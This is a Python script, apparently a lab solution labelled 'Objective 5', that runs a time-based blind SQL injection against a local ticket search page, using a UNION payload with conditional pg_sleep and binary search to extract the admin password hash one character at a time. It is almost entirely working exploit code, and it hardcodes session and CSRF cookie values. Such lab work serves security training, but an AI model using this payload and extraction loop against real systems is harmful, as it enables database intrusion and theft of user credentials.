"""
Objective 5 - Time-based blind SQL injection
Recovers auth_user.password for username='admin' one character at a time.
Every response has IDENTICAL content ("1 match.", same blank field) regardless
of the injected condition's truth value. The only signal is response latency:
a conditional pg_sleep() delays the reply when the condition is true.
"""
import time
import requests

BASE = "http://127.0.0.1:5001/tickets/search/"

# Grab a fresh sessionid/csrftoken from Burp (Proxy > HTTP history) before running.
COOKIES = {
    "csrftoken": "NvgGviz5La4wMfR4tEFswoWVTgb6C3Xa",
    "sessionid": "g0bvxofpwz56jx49gn7wb3s2og5pjjc9",
}
HEADERS = {"User-Agent": "Mozilla/5.0"}

SUBQUERY = "SELECT password FROM auth_user WHERE username='admin'"
SLEEP_SECONDS = 2     
THRESHOLD = 1.0 

def oracle(condition_sql: str) -> bool:
    """True if the response took noticeably longer than baseline (condition_sql was true)."""
    payload = (
        "zzzz' UNION SELECT NULL,"
        f"(SELECT CASE WHEN ({condition_sql}) THEN pg_sleep({SLEEP_SECONDS}) ELSE pg_sleep(0) END)::text,"
        "NULL,NULL--"
    )
    start = time.perf_counter()
    requests.get(BASE, params={"q": payload}, cookies=COOKIES, headers=HEADERS)
    elapsed = time.perf_counter() - start
    return elapsed > THRESHOLD

def get_length(subquery: str) -> int:
    lo, hi = 0, 200
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"LENGTH(({subquery})) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def get_char(subquery: str, pos: int) -> str:
    lo, hi = 32, 126 
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"ascii(substring(({subquery}) from {pos} for 1)) > {mid}"
        if oracle(cond):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def main():
    length = get_length(SUBQUERY)
    print(f"[+] Password length: {length}")
    result = ""
    for pos in range(1, length + 1):
        c = get_char(SUBQUERY, pos)
        result += c
        print(f"[{pos}/{length}] {result}")
    print(f"\n[+] Recovered hash: {result}")

if __name__ == "__main__":
    main()